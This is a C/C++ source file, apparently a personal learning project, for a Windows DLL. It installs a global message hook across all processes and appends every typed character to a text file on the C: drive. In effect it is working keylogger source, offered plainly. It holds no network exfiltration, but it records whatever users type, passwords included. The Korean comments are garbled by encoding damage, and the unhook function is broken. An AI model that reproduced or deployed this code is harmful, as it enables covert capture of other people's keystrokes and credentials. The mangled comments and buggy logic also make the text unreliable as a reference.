////////////////////////////////////////////////////////////////////////////////////
// ysoftman
// ������ �޽��� ��ŷ DLL
// �� �ڵ�� dll �� ����(���)�ϵ��� �����Ѵ�.
// �����Ӽ�->�Ϲ�->��������->���� ���̺귯�� (.dll) ����
////////////////////////////////////////////////////////////////////////////////////
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "winmm")

#include <windows.h>
#include <mmsystem.h>
#include <stdio.h>
//#include "MsgHookDll.h"

// ���� �޸𸮷� ���
#pragma data_seg(".MsgSection")
HINSTANCE ghInstDll = NULL;
HHOOK gMsgHook = NULL;
HWND ghServerWnd = NULL;
char gCommandBuffer[100] = "";
int gCount = 0;
#pragma data_seg()
//#pragma comment(linker, "/SECTION:.MsgSection, RWS")

// DLL ���� �Լ�
BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		ghInstDll = hInstance;
	}

	return TRUE;
}

// DLL �� �����޸� ������ ����Ͽ� �ٸ� ���μ����� ��ŷ�� �� �ִ�.
extern "C" __declspec(dllexport) LRESULT CALLBACK GetMsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		CallNextHookEx(gMsgHook, nCode, wParam, lParam);
	}

	char TempStr[256] = "";
	int len = 0;
	FILE *fp = NULL;
	MSG	*lpMsg = ((MSG*)lParam);

	if (lpMsg->message == WM_CHAR)
	{
		// Ư�� ��� �����ϱ�
		//gCount++;
		//sprintf(TempStr, "%c", lpMsg->wParam);
		//OutputDebugString(TempStr);
		//OutputDebugString("\n");
		//strcat(gCommandBuffer, TempStr);
		////if (gCount >= 8)
		//{
		//	OutputDebugString(gCommandBuffer);
		//	OutputDebugString("\n");
		//	if (strcmp(gCommandBuffer, "ysoftman") == 0)
		//	{
		//		OutputDebugString("Success\n");
		//		WinExec("notepad.exe", SW_SHOW);
		//	}
		//	else
		//	{
		//		OutputDebugString("Fail\n");
		//	}
		//	// �ʱ�ȭ
		//	gCount = 0;
		//	strcpy(gCommandBuffer, "");
		//}

		fp = fopen("c:\\MsgHookResult.txt", "a");
		// ASCII �ڵ� ���
		// backspace �� ���
		if (lpMsg->wParam == 8)
		{
			fprintf(fp, "<BackSpace>");
		}
		// tab �� ���
		else if (lpMsg->wParam == 9)
		{
			fprintf(fp, "<Tab>");
		}
		// enter �� ���(\r or \n)
		else if (lpMsg->wParam == 10 || lpMsg->wParam == 13)
		{
			fprintf(fp, "\n");
		}
		// esc �� ���
		else if (lpMsg->wParam == 27)
		{
			fprintf(fp, "<Esc>");
		}
		// space �� ���
		else if (lpMsg->wParam == 32)
		{
			fprintf(fp, " ");
		}
		else
		{
			fprintf(fp, "%c", lpMsg->wParam);
		}
		fclose(fp);
	}

	return CallNextHookEx(gMsgHook, nCode, wParam, lParam);
}

// Hook ��ġ �Լ�
extern "C" __declspec(dllexport) BOOL InstallHook()
{
	BOOL ret = FALSE;
	if (gMsgHook == NULL)
	{
		gMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgHookProc, ghInstDll, 0);
		if (gMsgHook)
		{
			ret = TRUE;
		}
	}
	return ret;
}

// Hook ���� �Լ�
extern "C" __declspec(dllexport) BOOL UninstallHook()
{
	BOOL ret = FALSE;
	if (gMsgHook == NULL)
	{
		ret = UnhookWindowsHookEx(gMsgHook);
		if (ret)
		{
			gMsgHook = NULL;
		}
	}
	return ret;
}
